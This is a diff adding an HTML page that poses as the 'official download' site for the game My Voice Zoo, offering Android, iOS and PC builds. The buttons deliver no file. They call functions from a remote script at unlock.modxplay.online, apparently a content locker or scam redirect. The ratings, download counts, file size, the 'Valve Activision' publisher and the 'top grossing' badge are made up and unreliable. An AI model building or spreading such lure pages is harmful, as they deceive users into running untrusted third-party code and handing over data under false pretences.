@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>My Voice Zoo - Official Download</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
+    
+  <script type="text/javascript" id="ogjs" src="https://unlock.modxplay.online/cl/js/vee7nx"></script>
+
+    <style type="text/css">
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700&display=swap');
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #fff;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .cr { width: 100%; max-width: 500px; }
+        .cr .cover img { width:100%; display: block; }
+        .cr .logo { display:flex; padding: 0 15px; align-items: center; }
+        .cr .logo img { width:130px; height:110px; border:1px solid #ddd; margin-top:-30px; border-radius:25px; background: #fff; z-index: 10; }
+        .cr .logo .info { padding:15px 0 0 15px; }
+        
+        .det { display:flex; margin:20px 0; }
+        .det .item { width:100%; text-align:center; font-size:.9rem; }
+
+        /* Buttons Style */
+        .download-container { padding: 0 20px; margin-bottom: 25px; }
+        .btn-down {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            background: #000;
+            color: #fff !important;
+            padding: 12px 0;
+            border-radius: 34px;
+            margin-bottom: 12px;
+            text-decoration: none !important;
+            font-weight: 500;
+            border: none;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn-down:hover { opacity: 0.8; transform: scale(1.02); }
+        .btn-down i { margin-right: 10px; font-size: 1.2rem; }
+
+        /* Slider Play Store Style */
+        .screenshots-container {
+            display: flex;
+            overflow-x: auto;
+            gap: 12px;
+            padding: 10px 20px;
+            scrollbar-width: none;
+            scroll-snap-type: x mandatory;
+            -webkit-overflow-scrolling: touch;
+        }
+        .screenshots-container::-webkit-scrollbar {
+            display: none;
+        }
+        .screenshot-item {
+            flex: 0 0 85%;
+            scroll-snap-align: start;
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid #eee;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+        .screenshot-item img {
+            width: 100%;
+            height: 200px;
+            display: block;
+        }
+
+        .bad { display:flex; overflow-x:auto; color:#666; padding: 0 15px; margin-bottom: 20px; }
+        .bad div { margin-right:10px; padding:4px 10px; border:1.3px solid #ccc; font-size:.8rem; white-space:nowrap; border-radius:5px; }
+
+        p { font-size:.85rem; color:#777; padding: 0 15px; line-height: 1.6; }
+        h1 { font-size:1.6rem; margin:0; font-weight: 700; }
+        h2 { font-size:1.4rem; padding: 0 15px; margin-top: 20px; font-weight: 600; }
+        
+        /* Footer Full Width */
+        footer {
+            background:#252525;
+            padding:40px 0 20px 0;
+            margin-top:40px;
+            color:#a1a1a1;
+            font-size:.9rem;
+            width: 100%;
+        }
+        .footer-content { max-width: 500px; margin: 0 auto; padding: 0 20px; }
+        hr { border-color: #444; margin: 20px 0; }
+        h4 { color:#eee; font-size:1rem; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="cr">
+    <div class="cover">
+        <img src="https://i.pinimg.com/1200x/9a/66/53/9a6653a9f62013c24992dfc8a64e426b.jpg" alt="Cover">
+    </div>
+    
+    <div class="logo">
+        <img src="https://static-cdn.jtvnw.net/ttv-boxart/1356530436_IGDB-272x380.jpg" alt="Logo">
+        <div class="info">
+            <h1>My Voice Zoo ! Mobile Apk </h1>
+            <small>Valve Activision</small>
+        </div>
+    </div>
+
+    <div class="det">
+        <div class="item">
+            <div class="icon">4.5 <i class="bi bi-star-fill"></i></div>
+            <div>230k reviews</div>
+        </div>
+        <div class="item">
+            <div class="icon"><i class="bi bi-cloud-arrow-down-fill"></i></div>
+            <div>641MB</div>
+        </div>
+        <div class="item">
+            <div class="icon">+7M</div>
+            <div>Downloads</div>
+        </div>
+    </div>
+
+    <div class="download-container">
+        <button onclick="startDownload('Android')" class="btn-down">
+            <i class="bi bi-android2"></i> Download For Android
+        </button>
+        <button onclick="startDownload('iOS')" class="btn-down">
+            <i class="bi bi-apple"></i> Download For iOS
+        </button>
+        <button onclick="startPC()" class="btn-down">
+            <i class="bi bi-windows"></i> Download For PC
+        </button>
+    </div>
+
+    <div class="screenshots-container">
+        <div class="screenshot-item">
+            <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/4015530/52fe1bdaee130d4c120c87c19ee06237fa85d8f8/ss_52fe1bdaee130d4c120c87c19ee06237fa85d8f8.1920x1080.jpg?t=1764608958" alt="SS1">
+        </div>
+         <div class="screenshot-item">
+            <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/4015530/7915083faef36fe27fc86d568e70fa3b47f1770f/ss_7915083faef36fe27fc86d568e70fa3b47f1770f.1920x1080.jpg?t=1764608958" alt="SS1">
+        </div>
+         <div class="screenshot-item">
+            <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/4015530/960f1e16163a03bd3fb349fa48b7649143318bca/ss_960f1e16163a03bd3fb349fa48b7649143318bca.1920x1080.jpg?t=1764608958" alt="SS1">
+        </div>
+        <div class="screenshot-item">
+            <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/4015530/89f3ed7578900eac5b0415acae8854f1d74d2483/ss_89f3ed7578900eac5b0415acae8854f1d74d2483.1920x1080.jpg?t=1764608958" alt="SS2">
+        </div>
+         <div class="screenshot-item">
+            <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/4015530/ea5d956fc8663ef4dbacd74b74b6838cd12d8aa3/ss_ea5d956fc8663ef4dbacd74b74b6838cd12d8aa3.1920x1080.jpg?t=1764608958" alt="SS3">
+        </div>
+          <div class="screenshot-item">
+            <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/4015530/83508b940b1e1d7b8fda4c670c7d8d7a3d5a667f/ss_83508b940b1e1d7b8fda4c670c7d8d7a3d5a667f.1920x1080.jpg?t=1764608958" alt="SS2">
+        </div>
+        <div class="screenshot-item">
+            <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/4015530/88eee32c07a0b7038c0ee7e0f8e4d47a8e491300/ss_88eee32c07a0b7038c0ee7e0f8e4d47a8e491300.1920x1080.jpg?t=1764608958" alt="SS4">
+        </div>
+        
+    </div>
+
+    <h2>About this game</h2>
+    <p>
+        My Voice Zoo is a distinctive Mobile and Pc simulation game that introduces an innovative approach to zoo management by relying entirely on voice interaction. Instead of traditional controls, players record their own sounds—such as growls, chirps, or humorous effects—and assign them to animals inside the digital zoo.
+    </p>
+
+    <div class="bad">
+        <div>#1 top grossing in board</div> 
+        <div>Abstract strategy</div>
+    </div>
+</div>
+   
+<footer>
+    <div class="footer-content">
+        <h4>My Voice Zoo Apk 1.2</h4>
+        <div class="row">
+            <div class="col-6">
+                <div class="mb-2">About game</div>
+                <div class="mb-2">My Voice Zoo mobile</div>
+                <div class="mb-2">Free download</div>
+            </div>
+            <div class="col-6">
+                <div class="mb-2">Help</div>
+                <div class="mb-2"></div>
+                <div class="mb-2">About us</div>
+            </div>
+        </div>
+        <hr>
+        <div class="text-center">
+            &copy; 2026 DownApk / All Rights Reserved
+        </div>
+    </div>
+</footer>
+
+<script type="text/javascript">
+    // Handler for Mobile
+    function startDownload(platform) {
+        console.log("Starting download for: " + platform);
+        if (typeof og_load === 'function') {
+            og_load();
+        } else {
+            alert("Starting " + platform + " download...");
+        }
+    }
+
+    // New Handler for PC
+    function startPC() {
+        console.log("Starting PC download handler");
+        if (typeof _cp === 'function') {
+            _cp();
+        } else {
+            alert("Starting PC download...");
+        }
+    }
+</script>
+
+</body>
+</html>
